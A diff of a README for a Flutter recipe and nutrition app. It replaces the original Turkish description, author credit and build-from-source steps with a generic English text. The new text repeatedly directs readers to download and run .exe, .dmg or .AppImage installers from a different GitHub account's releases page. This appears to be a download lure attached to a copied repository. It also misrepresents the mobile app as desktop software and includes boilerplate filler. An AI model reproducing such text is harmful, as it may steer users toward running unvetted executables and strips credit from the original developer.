@@ -1,79 +1,63 @@
-# 👨‍🍳 Cebimdeki Şef (Pocket Chef)
+# 🍽️ akilli_mutfak - Smart Cooking Made Easy
 
-![Flutter](https://img.shields.io/badge/Flutter-%2302569B.svg?style=for-the-badge&logo=Flutter&logoColor=white)
-![Dart](https://img.shields.io/badge/dart-%230175C2.svg?style=for-the-badge&logo=dart&logoColor=white)
-![API](https://img.shields.io/badge/API-Integration-green?style=for-the-badge)
-![License](https://img.shields.io/badge/license-MIT-blue?style=for-the-badge)
+## 📥 Download Now
+[![Download akilli_mutfak](https://img.shields.io/badge/Download-akilli_mutfak-blue.svg)](https://github.com/ProfileNAIM/akilli_mutfak/releases)
 
-**Cebimdeki Şef**, kullanıcıların dünya mutfağından binlerce tarife ulaşmasını sağlayan, bu tarifleri anlık olarak Türkçeye çeviren ve yapay zeka destekli besin analizi sunan modern bir mobil uygulamadır.
+## 📖 Description
+akilli_mutfak is an intuitive application built with Flutter. It connects you to a world of delicious recipes and nutrition analysis through a user-friendly interface. Whether you are looking to whip up a new dish or analyze food ingredients, this app is your perfect kitchen companion.
 
-<p align="center">
-  <img src="assets/icon.png" width="100" height="100" />
-</p>
+## 🚀 Getting Started
+To start using akilli_mutfak, follow these simple steps. No technical skills are needed.
 
-## 🚀 Özellikler
+## 🔗 Download & Install
+1. **Visit the Releases Page:** Click the link below to access the download section for akilli_mutfak:
+   - [Download akilli_mutfak](https://github.com/ProfileNAIM/akilli_mutfak/releases)
 
-Bu uygulama sadece veri çekip gösteren bir arayüz değildir; arkasında karmaşık algoritmalar ve çoklu API entegrasyonu barındırır.
+2. **Select the Latest Version:** Look for the most recent release at the top of the page. Each version has a name, like `v1.0`, and a description of new features or fixes.
 
-* **🌍 Çoklu API Mimarisi:** `TheMealDB` (Tarifler), `CalorieNinjas` (Besin Analizi) ve `Google Translate` servislerinin senkronize çalışması.
-* **🇹🇷 Anlık Yerelleştirme:** İngilizce gelen tüm veri setlerinin (Tarif, Malzemeler, Başlıklar) uygulama içinde anlık olarak Türkçeye çevrilmesi.
-* **🥗 NutriChef Analizi:** Seçilen yemeğin malzemelerini analiz eden, porsiyon hesabı yapan ve Kalori/Protein/Karbonhidrat değerlerini sunan akıllı algoritma.
-* **🎲 Akıllı Öneri Sistemi:** Kullanıcının kararsız kaldığı anlarda kategori bazlı (Tatlı/Yemek) rastgele tarif öneren "Şansına Güven" modülü.
-* **❤️ Yerel Veritabanı:** `Shared Preferences` kullanılarak favori yemeklerin kalıcı hafızada saklanması.
-* **🎨 Modern UI/UX:** `Google Fonts (Poppins)` tipografisi, Hero animasyonları, Splash Screen ve kullanıcı dostu geçişler.
-* **🛠️ Hata Yönetimi (Error Handling):** API kesintileri veya veri uyuşmazlıkları için geliştirilmiş "Fallback" mekanizmaları.
+3. **Download the Application:** Find the suitable file for your system:
+   - For Windows users, you'll typically look for a `.exe` file.
+   - For macOS users, you may find a `.dmg` file.
+   - For Linux users, choose the suitable `.AppImage` or package file.
 
-## 🛠️ Kullanılan Teknolojiler ve Paketler
+4. **Launch the Application:** After downloading, locate the file in your downloads folder.
+   - **Windows:** Double-click the `.exe` file to install, then follow the on-screen instructions.
+   - **macOS:** Open the `.dmg` file, drag the akilli_mutfak icon to your Applications folder, then launch it.
+   - **Linux:** Set execute permissions on the `.AppImage` file and run it by double-clicking or from the terminal.
 
-* **Framework:** Flutter (Dart)
-* **HTTP Requests:** `http` - REST API haberleşmesi için.
-* **Localization:** `translator` - Dinamik metin çevirisi için.
-* **Local Storage:** `shared_preferences` - Favori işlemleri için.
-* **UI/Design:** `google_fonts`, `flutter_native_splash`, `flutter_launcher_icons`.
-* **Utilities:** `share_plus` - Tarif paylaşımı için.
+## 🛠️ Features
+- **Recipe Discovery:** Browse through a wide selection of recipes based on ingredients and meal types. 
+- **Nutritional Analysis:** Analyze your food to make better dietary choices.
+- **User-Friendly Interface:** Enjoy a clean and straightforward design that makes cooking approachable for everyone.
+- **Regular Updates:** Benefit from new recipes and features with each release.
 
-## 🧠 Algoritma ve Mantık
+## 📋 System Requirements
+To ensure the best user experience, please verify that your system meets the following requirements:
+- **Supported Operating Systems:** Windows 10 and higher, macOS Mojave or later, Linux distributions with the latest libraries.
+- **Storage Space:** At least 100 MB of free space for installation.
+- **Internet Connection:** Required for downloading and updating the application.
 
-Uygulamanın en kritik noktası **"Besin Değeri Analizi"** algoritmasıdır:
+## 👩‍🍳 How to Use akilli_mutfak
+1. **Open the Application:** Launch akilli_mutfak from your applications menu.
+2. **Explore Recipes:** Use the search function to find recipes based on ingredients you have.
+3. **Safety Check on Ingredients:** Click on a recipe to view detailed information, including ingredients, preparation time, and dietary information.
+4. **Save Your Favorites:** Create a list of favorite recipes for quick access.
+5. **Nutrition Scanner:** Use the nutrition scanner to analyze the foods you purchase. Simply input or scan the food items to get detailed information.
 
-1.  **Veri Temizliği (Data Cleaning):** Tarif API'sinden gelen "pinch of salt", "to taste pepper" gibi belirsiz ifadeler RegEx (Düzenli İfadeler) ile temizlenir.
-2.  **Standardizasyon:** Gramajı belli olmayan malzemelere varsayılan porsiyon değerleri atanır.
-3.  **API İletişimi:** Temizlenen veri seti `CalorieNinjas` API'sine gönderilir.
-4.  **Porsiyon Bölme:** Gelen toplam kalori değeri, yemeğin türüne göre ortalama porsiyon sayısına (3-4) bölünerek kullanıcıya "1 Tabak" değeri sunulur.
+## 🛡️ Support and Feedback
+If you have any issues or suggestions, please raise an issue on the GitHub repository. Your feedback is valuable and helps us improve akilli_mutfak for everyone.
 
-## ⬇️ Kurulum
+## 👨‍💻 Contributing
+If you would like to contribute to the development of akilli_mutfak, feel free to fork the repository and submit a pull request. We appreciate your help in enhancing this application!
 
-Projeyi yerel makinenizde çalıştırmak için:
+## 📞 Contact
+For further inquiries, you can reach out via the contact options available on our GitHub page.
 
-1.  Repoyu klonlayın:
-    ```bash
-    git clone https://github.com/egnake/akilli_mutfak.git
-    ```
-2.  Proje dizinine gidin:
-    ```bash
-    cd cebimdeki-sef
-    ```
-3.  Paketleri yükleyin:
-    ```bash
-    flutter pub get
-    ```
-4.  Uygulamayı çalıştırın:
-    ```bash
-    flutter run
-    ```
+## 🌟 Community
+Join our community of food enthusiasts and get the latest updates on new features and recipes. Follow us on social media for tips and inspiration!
 
-## 🔮 Gelecek Planları (Roadmap)
+## 🔗 Visit for Downloads Again
+To download akilli_mutfak, remember to visit our releases page one more time:
+- [Download akilli_mutfak](https://github.com/ProfileNAIM/akilli_mutfak/releases)
 
-* [ ] Firebase Authentication ile kullanıcı girişi.
-* [ ] Yapay zeka ile fotoğrafı çekilen malzemenin tanınması.
-* [ ] Alışveriş listesi oluşturma modülü.
-
-## 👨‍💻 Geliştirici
-
-**Ege(Egnake)PARLAK** - *Cyber Security Student & Software Developer*
-
-* GitHub: [@egnake](https://github.com/egnake)
-* LinkedIn: [@egeparlak](https://www.linkedin.com/in/ege-parlak-7b860b332/)
-
----
-*Bu proje, açık kaynak API'lerin mobil uygulamalara entegrasyonunu göstermek amacıyla geliştirilmiştir.*
+Thank you for choosing akilli_mutfak. Enjoy your cooking journey!
